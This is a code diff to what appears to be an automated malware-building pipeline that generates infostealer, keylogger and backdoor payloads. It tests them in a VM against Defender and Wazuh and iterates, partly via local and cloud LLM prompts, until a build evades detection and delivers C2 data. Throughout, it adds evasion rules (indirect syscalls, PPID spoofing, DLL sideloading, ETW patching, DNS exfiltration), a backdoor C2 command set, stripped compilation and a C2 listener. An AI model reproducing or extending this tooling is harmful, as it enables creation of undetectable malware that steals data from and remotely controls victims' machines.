@@ -201,6 +201,46 @@ DETECTION_RULES = [
             "timing": {"avoid": ["deferred"], "prefer": ["triggered"]},
         },
     },
+    {
+        "signals": ["WAZUH Level=12", "WAZUH Level=13", "WAZUH Level=14", "WAZUH Level=15"],
+        "desc": "Wazuh critical alert — high-confidence detection",
+        "changes": {
+            "api_resolve": {"avoid": ["direct_import", "loadlibrary"], "prefer": ["indirect_syscall", "peb_walk"]},
+            "data_obfuscation": {"avoid": ["plaintext", "xor_encrypt"], "prefer": ["aes_encrypt", "stack_strings"]},
+            "execution": {"avoid": ["sequential"], "prefer": ["callback_abuse", "fiber"]},
+        },
+    },
+    {
+        "signals": ["MITRE:T1059", "MITRE:T1218", "MITRE:T1053"],
+        "desc": "Wazuh MITRE-tagged detection — execution/proxy/scheduled task",
+        "changes": {
+            "process": {"avoid": ["standalone"], "prefer": ["dll_sideload", "ppid_spoof"]},
+            "timing": {"avoid": ["immediate"], "prefer": ["triggered", "deferred"]},
+        },
+    },
+    {
+        "signals": ["MITRE:T1071", "MITRE:T1041", "MITRE:T1048"],
+        "desc": "Wazuh MITRE-tagged detection — C2/exfiltration",
+        "changes": {
+            "exfil": {"avoid": ["tcp_direct", "http_post"], "prefer": ["dns_exfil"]},
+            "timing": {"avoid": ["immediate", "staged_jitter"], "prefer": ["workday", "triggered"]},
+        },
+    },
+    {
+        "signals": ["MITRE:T1547", "MITRE:T1546", "MITRE:T1543"],
+        "desc": "Wazuh MITRE-tagged detection — persistence",
+        "changes": {
+            "persistence": {"avoid": ["registry_run", "startup_folder"], "prefer": ["scheduled_task", "none"]},
+        },
+    },
+    {
+        "signals": ["Sysmon", "EventID 1", "process creation"],
+        "desc": "Wazuh Sysmon-based detection — process creation telemetry",
+        "changes": {
+            "process": {"avoid": ["standalone"], "prefer": ["ppid_spoof", "dll_sideload"]},
+            "timing": {"avoid": ["immediate"], "prefer": ["deferred"]},
+        },
+    },
 ]
 
 # Compile error → which layers are incompatible
@@ -405,6 +445,8 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
                 "collectors/keylogger",
                 "collectors/clipboard",
             ]
+        elif malware_type == "backdoor":
+            collectors = None
         else:
             collectors = ["collectors/system_info"]
 
@@ -431,7 +473,7 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
     }
 
     obfuscation_map = {
-        "xor_encrypt": "evasion/string_encrypt",
+        "xor_encrypt": "evasion/aes_encrypt",
         "stack_strings": "evasion/stack_strings",
         "aes_encrypt": "evasion/aes_encrypt",
     }
@@ -452,6 +494,21 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
     process_key = config.get("process", "standalone")
     persist_key = config.get("persistence", "none")
 
+    # Map api_resolve options to actual chunk paths
+    api_resolve_map = {
+        "api_hash_djb2":    "api_resolve/api_hash_djb2",
+        "api_hash_crc32":   "api_resolve/api_hash_djb2",
+        "peb_walk":         "api_resolve/peb_walk",
+        "indirect_syscall": "evasion/indirect_syscall",
+    }
+
+    # Map process options to actual chunk paths
+    process_map = {
+        "ppid_spoof":     "process/ppid_spoof",
+        "dll_sideload":   "process/ppid_spoof",
+        "process_hollow": "process/ppid_spoof",
+    }
+
     lines = [
         f"name: {malware_type}_adaptive",
         f"description: Adaptive {malware_type} — layers selected by evasion_selector",
@@ -461,32 +518,75 @@ def config_to_recipe(config, malware_type="infostealer", collectors=None):
         "  - core/run_cmd",
         "  - core/file_ops",
         "",
-        "collectors:",
     ]
-    for c in collectors:
-        lines.append(f"  - {c}")
 
-    lines.extend([
-        "",
-        f"exfil: {exfil_map.get(config.get('exfil', 'tcp_direct'), 'exfil/tcp_direct')}",
-        f"arch: {arch_map.get(config.get('execution', 'sequential'), 'arch/sequential')}",
-    ])
+    if malware_type == "backdoor":
+        c2_transport = config.get("exfil", "tcp_direct")
+        c2_chunk = "c2/winhttp_beacon" if "http" in c2_transport else "c2/tcp_beacon"
+        lines.append(f"c2: {c2_chunk}")
+        lines.append("")
+        lines.append("commands:")
+        lines.append("  - commands/cmd_sysinfo")
+        lines.append("  - commands/cmd_processes")
+        lines.append("  - commands/cmd_filelist")
+        lines.append("  - commands/cmd_fileread")
+        lines.append("  - commands/cmd_filewrite")
+        lines.append("  - commands/cmd_screenshot")
+        lines.append("  - commands/cmd_registry")
+        lines.append("  - commands/cmd_netinfo")
+        lines.append("")
+        lines.append("arch: arch/backdoor")
+    else:
+        lines.append("collectors:")
+        for c in collectors:
+            lines.append(f"  - {c}")
+        lines.extend([
+            "",
+            f"exfil: {exfil_map.get(config.get('exfil', 'tcp_direct'), 'exfil/tcp_direct')}",
+            f"arch: {arch_map.get(config.get('execution', 'sequential'), 'arch/sequential')}",
+        ])
 
+    # Only add api_resolve if the actual chunk file exists
     if api_resolve_key not in ("direct_import", "loadlibrary"):
-        lines.append(f"api_resolve: api_resolve/{api_resolve_key}")
+        chunk_path = api_resolve_map.get(api_resolve_key, f"api_resolve/{api_resolve_key}")
+        if api_resolve_key == "indirect_syscall":
+            evasion_chunks.append(chunk_path)
+        elif (CHUNKS_DIR / f"{chunk_path}.c").exists():
+            lines.append(f"api_resolve: {chunk_path}")
 
-    process_chunk = f"process/{process_key}"
-    if process_key != "standalone" and (CHUNKS_DIR / f"{process_chunk}.c").exists():
-        lines.append(f"process: {process_chunk}")
+    # Only add process chunk if it actually exists
+    if process_key != "standalone":
+        chunk_path = process_map.get(process_key, f"process/{process_key}")
+        if (CHUNKS_DIR / f"{chunk_path}.c").exists():
+            lines.append(f"process: {chunk_path}")
+
+    # Add proven evasion chunks that always help
+    always_safe = ["evasion/etw_patch", "evasion/header_stomp", "evasion/behavioral_pacing"]
+    for chunk in always_safe:
+        if chunk not in evasion_chunks and (CHUNKS_DIR / f"{chunk}.c").exists():
+            evasion_chunks.append(chunk)
 
     if evasion_chunks:
-        lines.append("")
-        lines.append("evasion:")
+        # Deduplicate and verify all chunks exist
+        seen = set()
+        valid_chunks = []
         for ec in evasion_chunks:
-            lines.append(f"  - {ec}")
+            if ec in seen:
+                continue
+            seen.add(ec)
+            ext = ".h" if ec.endswith("strings") or ec.endswith("encrypt") and "aes" not in ec else ".c"
+            if (CHUNKS_DIR / f"{ec}{ext}").exists() or (CHUNKS_DIR / f"{ec}.c").exists():
+                valid_chunks.append(ec)
+        if valid_chunks:
+            lines.append("")
+            lines.append("evasion:")
+            for ec in valid_chunks:
+                lines.append(f"  - {ec}")
 
     if persist_key != "none":
-        lines.append(f"persist: persist/{persist_key}")
+        persist_chunk = f"persist/{persist_key}"
+        if (CHUNKS_DIR / f"{persist_chunk}.c").exists():
+            lines.append(f"persist: {persist_chunk}")
 
     lines.extend([
         "",
@@ -571,7 +671,9 @@ def parse_llm_response(response_text, auto_config):
 
 
 AV_DETECTION_CMDS = {
-    "defender": 'powershell -Command "Get-MpThreatDetection | Select-Object -Last 3 | Format-List"',
+    "defender": 'powershell -Command "Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-3) } | Select-Object -Last 3 | Format-List"',
+    "wazuh": 'powershell -Command "Get-EventLog -LogName Application -Source OssecSvc -Newest 10 -After (Get-Date).AddMinutes(-3) -ErrorAction SilentlyContinue | Format-List"',
+    "elastic": 'powershell -Command "Get-WinEvent -LogName Microsoft-Windows-Windows\\ Defender/Operational -MaxEvents 10 -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq 1116 -or $_.Id -eq 1117 } | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-3) } | Format-List"',
     "crowdstrike": 'powershell -Command "Get-EventLog -LogName Application -Source CsFalcon* -Newest 5 | Format-List"',
     "sentinelone": 'powershell -Command "Get-EventLog -LogName Application -Source SentinelOne* -Newest 5 | Format-List"',
     "carbon_black": 'powershell -Command "Get-EventLog -LogName Application -Source Cb* -Newest 5 | Format-List"',
@@ -586,6 +688,50 @@ def get_detection_cmd():
     return AV_DETECTION_CMDS.get(av_type, AV_DETECTION_CMDS["defender"])
 
 
+def check_wazuh_indexer(minutes=3, min_level=8):
+    """Query Wazuh indexer on host for high-level alerts from VM agent."""
+    import urllib.request
+    import json as _json
+    indexer_url = os.environ.get("WAZUH_INDEXER_URL", "http://localhost:9201")
+    body = _json.dumps({
+        "size": 10,
+        "sort": [{"timestamp": "desc"}],
+        "query": {
+            "bool": {
+                "must": [
+                    {"term": {"agent.id": "001"}},
+                    {"range": {"rule.level": {"gte": min_level}}},
+                    {"range": {"timestamp": {"gte": f"now-{minutes}m"}}},
+                ]
+            }
+        },
+    }).encode()
+    try:
+        req = urllib.request.Request(
+            f"{indexer_url}/wazuh-alerts-*/_search",
+            data=body,
+            headers={"Content-Type": "application/json"},
+        )
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            data = _json.loads(resp.read())
+            hits = data.get("hits", {}).get("hits", [])
+            if not hits:
+                return ""
+            lines = []
+            for h in hits:
+                rule = h["_source"].get("rule", {})
+                mitre = rule.get("mitre", {})
+                mitre_str = ",".join(mitre.get("id", [])) if mitre else ""
+                lines.append(
+                    f"WAZUH Level={rule.get('level')} [{rule.get('id')}] "
+                    f"{rule.get('description', '')[:100]} "
+                    f"{'MITRE:' + mitre_str if mitre_str else ''}"
+                )
+            return "\n".join(lines)
+    except Exception:
+        return ""
+
+
 def run_hybrid_loop(
     malware_type="infostealer",
     c2_ip="10.0.2.2",
@@ -594,12 +740,14 @@ def run_hybrid_loop(
     max_llm=3,
     max_cloud=2,
     assembler_path="templates/chunks/assembler.py",
-    llm_url="http://localhost:1234",
+    llm_url=None,
     vm_port=10022,
     vm_user="vmuser",
     vm_pass="vmuser123",
     dry_run=False,
 ):
+    if llm_url is None:
+        llm_url = os.environ.get("LLM_URL", "http://localhost:11235")
     """
     Hybrid evasion loop:
       Tier 1 (runs 1-N): Algorithmic selection from detection rules
@@ -613,6 +761,14 @@ def run_hybrid_loop(
     history = load_history()
     config = None
     max_total = max_algorithmic + max_llm + max_cloud
+    results_log = []
+
+    print(f"\n  Hybrid Evasion Loop: {malware_type}", flush=True)
+    print(f"  Tiers: {max_algorithmic} algorithmic + {max_llm} local LLM + {max_cloud} cloud = {max_total} max", flush=True)
+    print(f"  LLM: {llm_url}", flush=True)
+
+    subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
+    time.sleep(0.5)
 
     for run_num in range(1, max_total + 1):
         detection_text = ""
@@ -627,15 +783,11 @@ def run_hybrid_loop(
 
         # ── Tier selection ──
         if run_num <= max_algorithmic:
-            tier = "algorithmic"
+            tier_label = "Tier 1 (Algorithmic)"
             config = select_layers(detection_text, compile_error, config, run_index=run_num - 1)
-            print(f"\n{'='*60}")
-            print(f"Run {run_num}/{max_total} — Tier 1 (Algorithmic)")
         elif run_num <= max_algorithmic + max_llm:
-            tier = "local_llm"
+            tier_label = "Tier 2 (Local LLM)"
             prompt, auto_config = build_llm_prompt(detection_text, compile_error, config, malware_type)
-            print(f"\n{'='*60}")
-            print(f"Run {run_num}/{max_total} — Tier 2 (Local LLM)")
             if not dry_run:
                 try:
                     import requests
@@ -643,17 +795,14 @@ def run_hybrid_loop(
                         json={"messages": [{"role": "user", "content": prompt}],
                               "max_tokens": 1024, "temperature": 0.7}, timeout=120)
                     config = parse_llm_response(resp.json()["choices"][0]["message"]["content"], auto_config)
-                    print("  LLM adjustments applied")
                 except Exception as e:
-                    print(f"  LLM failed ({e}), using algorithmic")
+                    tier_label += f" (fallback: {e})"
                     config = auto_config
             else:
                 config = auto_config
         else:
-            tier = "cloud_llm"
+            tier_label = "Tier 3 (Cloud LLM)"
             _, auto_config = build_llm_prompt(detection_text, compile_error, config, malware_type)
-            print(f"\n{'='*60}")
-            print(f"Run {run_num}/{max_total} — Tier 3 (Cloud LLM)")
             config = auto_config
             for layer, info in LAYERS.items():
                 caught_opts = {r.get("config", {}).get(layer) for r in history.get("runs", []) if r.get("detected")}
@@ -662,15 +811,29 @@ def run_hybrid_loop(
                         config[layer] = opt
                         break
 
-        print(f"{'='*60}")
-        print(format_selection_report(config))
+        # ── Progress bar ──
+        pct = run_num * 100 // max_total
+        bar_filled = run_num * 30 // max_total
+        bar = "#" * bar_filled + "-" * (30 - bar_filled)
+        # Run history icons: S=success, X=detected, E=compile/assemble error, ?=no c2
+        run_icons = ""
+        for r in results_log:
+            run_icons += r
+        print(f"\n{'='*60}", flush=True)
+        print(f"  [{bar}] {pct:3d}%  Run {run_num}/{max_total}  {tier_label}", flush=True)
+        if run_icons:
+            print(f"  History: {run_icons}", flush=True)
+        print(f"{'='*60}", flush=True)
+        print(format_selection_report(config), flush=True)
 
         if dry_run:
-            print("\n  [DRY RUN] Would assemble → compile → deploy → validate")
+            print("  [DRY RUN] Would assemble > compile > deploy > validate", flush=True)
             record_run(config, detected=False, success=False)
+            results_log.append("D")
             continue
 
         # ── Assemble ──
+        print("  [1/5] Assembling...", end="", flush=True)
         recipe_content = config_to_recipe(config, malware_type)
         recipe_path = tempfile.mktemp(suffix=".yaml")
         with open(recipe_path, "w") as f:
@@ -680,9 +843,11 @@ def run_hybrid_loop(
                                 capture_output=True, text=True)
         os.unlink(recipe_path)
         if result.returncode != 0:
-            print(f"\n  ASSEMBLE FAILED: {result.stderr[:200]}")
+            print(f" FAIL\n    {result.stderr.strip()[:200]}", flush=True)
             record_run(config, detected=False, success=False)
+            results_log.append("E")
             continue
+        print(" OK", flush=True)
 
         with open(src_path) as f:
             src = f.read()
@@ -691,36 +856,48 @@ def run_hybrid_loop(
         # ── Obfuscate ──
         obf_level = os.environ.get("MALGEN_OBFUSCATION", "heavy")
         if obf_level != "none":
+            print(f"  [2/5] Obfuscating ({obf_level})...", end="", flush=True)
             try:
-                from templates.chunks.obfuscate import obfuscate as obf_fn
-                src = obf_fn(src, level=obf_level, llm_url=llm_url)
-                print(f"  Obfuscated (level={obf_level})")
+                import importlib.util
+                _obf_path = str(CHUNKS_DIR / "obfuscate.py")
+                _spec = importlib.util.spec_from_file_location("obfuscate", _obf_path)
+                _mod = importlib.util.module_from_spec(_spec)
+                _spec.loader.exec_module(_mod)
+                src = _mod.obfuscate(src, level=obf_level, llm_url=llm_url)
+                print(" OK", flush=True)
             except Exception as e:
-                print(f"  Obfuscation failed ({e}), using raw source")
+                print(f" skip ({e})", flush=True)
+        else:
+            print("  [2/5] Obfuscation: off", flush=True)
 
         with open(src_path, "w") as f:
             f.write(src)
 
         # ── Compile ──
+        print("  [3/5] Compiling...", end="", flush=True)
         exe_path = src_path.replace(".c", ".exe")
         cr = subprocess.run(
-            ["x86_64-w64-mingw32-gcc", "-o", exe_path, src_path,
-             "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32", "-static"],
+            ["x86_64-w64-mingw32-gcc", "-mwindows", "-o", exe_path, src_path,
+             "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
+             "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
+             "-static", "-s", "-Wl,--strip-all"],
             capture_output=True, text=True)
         os.unlink(src_path)
         if cr.returncode != 0:
-            print(f"\n  COMPILE FAILED: {cr.stderr[:200]}")
+            print(f" FAIL\n    {cr.stderr.strip()[:200]}", flush=True)
             run_data = {"config": config, "detected": False, "success": False, "compile_error": cr.stderr}
             history["runs"].append(run_data)
             save_history(history)
+            results_log.append("E")
             continue
-
-        print(f"\n  Compiled: {os.path.getsize(exe_path)} bytes")
+        exe_size = os.path.getsize(exe_path)
+        print(f" OK ({exe_size:,} bytes)", flush=True)
 
         # ── Deploy + validate ──
         ssh = f"sshpass -p '{vm_pass}' ssh -o StrictHostKeyChecking=no -p {vm_port} {vm_user}@localhost"
         scp = f"sshpass -p '{vm_pass}' scp -o StrictHostKeyChecking=no -P {vm_port}"
 
+        print("  [4/5] Deploying...", end="", flush=True)
         subprocess.run(f"{scp} {exe_path} {vm_user}@localhost:'C:\\Users\\{vm_user}\\Desktop\\payload.exe'",
                        shell=True, capture_output=True)
         time.sleep(2)
@@ -731,40 +908,121 @@ def run_hybrid_loop(
             det_cmd = get_detection_cmd()
             det = subprocess.run(f"""{ssh} '{det_cmd}'""",
                                  shell=True, capture_output=True, text=True)
-            print(f"  QUARANTINED: {det.stdout.strip()[:200]}")
-            record_run(config, detected=True, detection_text=det.stdout.strip(), success=False)
+            det_text = det.stdout.strip()
+            wazuh_det = check_wazuh_indexer(minutes=3, min_level=5)
+            if wazuh_det:
+                det_text = f"{det_text}\n{wazuh_det}" if det_text else wazuh_det
+            print(f" QUARANTINED\n    {det_text[:200]}", flush=True)
+            record_run(config, detected=True, detection_text=det_text, success=False)
             os.unlink(exe_path)
             history = load_history()
+            results_log.append("X")
             continue
+        print(" OK (survived Defender)", flush=True)
 
+        print("  [5/5] Executing + C2 capture...", end="", flush=True)
         c2_out = tempfile.mktemp(suffix=".bin")
-        listener = subprocess.Popen(f"timeout 40 nc -l -p {c2_port} > {c2_out}", shell=True)
+        subprocess.run(f"fuser -k {c2_port}/tcp", shell=True, capture_output=True)
+        time.sleep(0.5)
+        c2_script = (
+            f"import socket\n"
+            f"srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+            f"srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
+            f"srv.bind(('0.0.0.0', {c2_port})); srv.listen(1); srv.settimeout(90)\n"
+            f"try:\n"
+            f"    conn, addr = srv.accept()\n"
+            f"    data = b''; conn.settimeout(30)\n"
+            f"    while True:\n"
+            f"        try:\n"
+            f"            chunk = conn.recv(65536)\n"
+            f"            if not chunk: break\n"
+            f"            data += chunk\n"
+            f"        except socket.timeout: break\n"
+            f"    conn.close()\n"
+            f"    with open('{c2_out}', 'wb') as f: f.write(data)\n"
+            f"except socket.timeout:\n"
+            f"    open('{c2_out}', 'wb').close()\n"
+            f"srv.close()\n"
+        )
+        listener = subprocess.Popen(["python3", "-u", "-c", c2_script])
         time.sleep(1)
-        subprocess.Popen(f"{ssh} 'cmd /c \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\"'",
-                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if malware_type == "keylogger":
+            subprocess.run(f"{ssh} 'schtasks /create /tn evasion_test /tr "
+                           f"\"C:\\Users\\{vm_user}\\Desktop\\payload.exe --batch 15\" "
+                           f"/sc once /st 00:00 /f /it /rl highest'",
+                           shell=True, capture_output=True)
+            subprocess.run(f"{ssh} 'schtasks /run /tn evasion_test'",
+                           shell=True, capture_output=True)
+        else:
+            subprocess.Popen(f"{ssh} 'cmd /c \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\"'",
+                             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         listener.wait()
+        if malware_type == "keylogger":
+            subprocess.run(f"{ssh} 'schtasks /delete /tn evasion_test /f'",
+                           shell=True, capture_output=True)
         os.unlink(exe_path)
 
         c2_size = os.path.getsize(c2_out) if os.path.exists(c2_out) else 0
-        if c2_size > 100:
-            print(f"  C2: {c2_size} bytes — SUCCESS")
+        time.sleep(5)
+        # VM cleanup
+        subprocess.run(f"{ssh} 'taskkill /f /im payload.exe 2>NUL'",
+                       shell=True, capture_output=True)
+        subprocess.run(f"{ssh} 'del \"C:\\Users\\{vm_user}\\Desktop\\payload.exe\" 2>NUL'",
+                       shell=True, capture_output=True)
+        wazuh_det = check_wazuh_indexer(minutes=3, min_level=8)
+        c2_threshold = 4 if malware_type == "backdoor" else 100
+        if c2_size > c2_threshold and not wazuh_det:
+            print(f" SUCCESS ({c2_size:,} bytes)", flush=True)
             record_run(config, detected=False, success=True)
             if os.path.exists(c2_out):
                 os.unlink(c2_out)
+            results_log.append("S")
+            # ── Final success summary ──
+            print(f"\n{'='*60}", flush=True)
+            bar = "#" * 30
+            print(f"  [{bar}] SUCCESS on run {run_num}/{max_total}", flush=True)
+            print(f"  Defender: 0 | Wazuh: 0 high | C2: {c2_size:,} bytes", flush=True)
+            print(f"  History: {''.join(results_log)}", flush=True)
+            print(f"{'='*60}", flush=True)
             return True, config, run_num, load_history()
         else:
             det_cmd = get_detection_cmd()
             det = subprocess.run(f"""{ssh} '{det_cmd}'""",
                                  shell=True, capture_output=True, text=True)
             det_text = det.stdout.strip()
-            print(f"  C2: {c2_size} bytes — FAIL")
-            if det_text:
-                print(f"  Detection: {det_text[:200]}")
-            record_run(config, detected=bool(det_text), detection_text=det_text or "no_c2_data", success=False)
+            if wazuh_det:
+                det_text = f"{det_text}\n{wazuh_det}" if det_text else wazuh_det
+            detected = bool(det_text)
+            if wazuh_det:
+                print(f" WAZUH ALERT\n    {wazuh_det[:200]}", flush=True)
+                results_log.append("W")
+            elif detected:
+                print(f" DETECTED\n    {det_text[:200]}", flush=True)
+                results_log.append("X")
+            else:
+                print(f" no C2 data ({c2_size} bytes)", flush=True)
+                results_log.append("?")
+            record_run(config, detected=detected, detection_text=det_text or "no_c2_data", success=False)
             if os.path.exists(c2_out):
                 os.unlink(c2_out)
             history = load_history()
 
+    # ── Final failure summary ──
+    print(f"\n{'='*60}", flush=True)
+    print(f"  FAILED after {max_total} runs", flush=True)
+    print(f"  History: {''.join(results_log)}", flush=True)
+    counts = {"S": 0, "X": 0, "E": 0, "?": 0, "D": 0, "W": 0}
+    for r in results_log:
+        counts[r] = counts.get(r, 0) + 1
+    parts = []
+    if counts["S"]: parts.append(f"{counts['S']} success")
+    if counts["X"]: parts.append(f"{counts['X']} detected (Defender)")
+    if counts["W"]: parts.append(f"{counts['W']} detected (Wazuh)")
+    if counts["E"]: parts.append(f"{counts['E']} build error")
+    if counts["?"]: parts.append(f"{counts['?']} no C2 data")
+    if parts:
+        print(f"  Summary: {', '.join(parts)}", flush=True)
+    print(f"{'='*60}", flush=True)
     return False, config, max_total, load_history()
 
 
@@ -772,20 +1030,29 @@ if __name__ == "__main__":
     import sys
 
     if len(sys.argv) > 1 and sys.argv[1] == "--run":
-        mtype = sys.argv[2] if len(sys.argv) > 2 else "infostealer"
-        dry = "--dry-run" in sys.argv
-        av_type = os.environ.get("MALGEN_AV_TYPE", "defender")
-        max_runs = int(os.environ.get("MALGEN_MAX_RUNS", "10"))
-        max_algo = min(5, max_runs)
-        max_llm_tier = min(3, max(0, max_runs - max_algo))
-        max_cloud_tier = max(0, max_runs - max_algo - max_llm_tier)
+        import argparse as _ap
+        _p = _ap.ArgumentParser(prog="evasion_selector --run")
+        _p.add_argument("malware_type", nargs="?", default="infostealer")
+        _p.add_argument("--dry-run", action="store_true")
+        _p.add_argument("--max-algo", type=int, default=None)
+        _p.add_argument("--max-llm", type=int, default=None)
+        _p.add_argument("--max-cloud", type=int, default=None)
+        _p.add_argument("--llm-url", default=None)
+        _a = _p.parse_args(sys.argv[2:])
+        max_algo = _a.max_algo if _a.max_algo is not None else int(os.environ.get("MALGEN_MAX_ALGORITHMIC", "5"))
+        max_llm_tier = _a.max_llm if _a.max_llm is not None else int(os.environ.get("MALGEN_MAX_LLM", "3"))
+        max_cloud_tier = _a.max_cloud if _a.max_cloud is not None else int(os.environ.get("MALGEN_MAX_CLOUD", "2"))
+        llm_url = _a.llm_url or os.environ.get("LLM_URL", None)
+        vm_port = int(os.environ.get("VM_PORT", "10022"))
+        vm_user = os.environ.get("VM_USER", "vmuser")
+        vm_pass = os.environ.get("VM_PASS", "vmuser123")
+        c2_port = int(os.environ.get("C2_PORT", "9001"))
         ok, cfg, runs, hist = run_hybrid_loop(
-            malware_type=mtype, dry_run=dry,
+            malware_type=_a.malware_type, dry_run=_a.dry_run,
             max_algorithmic=max_algo, max_llm=max_llm_tier, max_cloud=max_cloud_tier,
+            llm_url=llm_url, vm_port=vm_port, vm_user=vm_user, vm_pass=vm_pass,
+            c2_port=c2_port,
         )
-        print(f"\n{'='*60}")
-        print(f"{'SUCCESS' if ok else 'FAILED'} after {runs} runs")
-        print(format_selection_report(cfg))
 
     elif len(sys.argv) > 1 and sys.argv[1] == "--test":
         detection = "Trojan:Win32/Stealer.G!MTB - Behavior:Win32/SuspiciousProcess"
@@ -805,10 +1072,14 @@ if __name__ == "__main__":
         print(f"Evasion Selector — {total:,} possible combinations")
         print()
         print("Usage:")
-        print("  --run [type]              Run hybrid loop (live VM)")
-        print("  --run [type] --dry-run    Simulate without VM")
-        print("  --test                    Test with sample detection")
-        print("  --detection 'text'        Show selection for detection text")
+        print("  --run [type]                    Run hybrid loop (live VM)")
+        print("  --run [type] --dry-run          Simulate without VM")
+        print("  --run [type] --max-algo 20      Set Tier 1 algorithmic attempts")
+        print("  --run [type] --max-llm 5        Set Tier 2 local LLM attempts")
+        print("  --run [type] --max-cloud 3      Set Tier 3 cloud LLM attempts")
+        print("  --run [type] --llm-url URL      Local LLM endpoint")
+        print("  --test                          Test with sample detection")
+        print("  --detection 'text'              Show selection for detection text")
         history = load_history()
         print(f"\nHistory: {len(history.get('runs', []))} runs, "
               f"{len(history.get('successes', []))} successes, "
